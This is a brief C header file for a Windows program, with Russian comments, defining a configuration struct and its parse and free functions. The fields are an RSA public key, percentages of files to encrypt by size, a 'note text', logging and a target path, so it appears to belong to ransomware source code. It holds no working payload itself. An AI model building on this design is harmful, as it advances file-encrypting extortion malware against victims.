#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>

typedef struct {
    char* rsa_pub_key;      // Публичный RSA-ключ
    float stripe_percent[5]; // Проценты шифрования для разных размеров
    char* note_text;        // Текст записки
    BOOL log_enabled;       // Логирование
    char* target_path;      // Опция -path
} Config;

Config parse_config(const char* json);
void free_config(Config* config);

#endif